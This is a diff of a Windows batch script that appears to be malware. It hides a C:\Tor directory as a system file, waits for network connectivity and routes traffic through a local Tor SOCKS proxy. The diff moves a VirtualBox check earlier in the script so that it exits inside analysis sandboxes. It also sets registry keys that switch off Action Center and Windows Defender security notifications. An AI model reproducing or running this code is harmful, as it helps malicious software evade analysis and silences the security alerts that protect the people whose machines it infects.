@@ -3,19 +3,18 @@ attrib +s +h +i "C:\Tor"
 :connectivitycheck
 ping www.google.com -n 1 -w 5000 >NUL
 if errorlevel 1 goto Connectivitycheck
+for /f "tokens=1* delims=: " %%A in (
+  'powershell Get-WmiObject Win32_Computersystem model 2^>NUL^|find "Model            :"'
+) Do set model=%%B
+if "%model%" == "VirtualBox" (
+    exit
+)
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (set "proxy=--socks5-hostname 127.0.0.1:9050") else (
   set "proxy="
 )
 
-for /f "tokens=1* delims=: " %%A in (
-  'powershell Get-WmiObject Win32_Computersystem model 2^>NUL^|find "Model            :"'
-) Do set model=%%B
-
-if "%model%" == "VirtualBox" (
-    exit
-)
 cd %~dp0
 REG ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell" /v "UseActionCenterExperience" /t REG_DWORD /d 0 /f
 REG ADD "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 00000001 /f
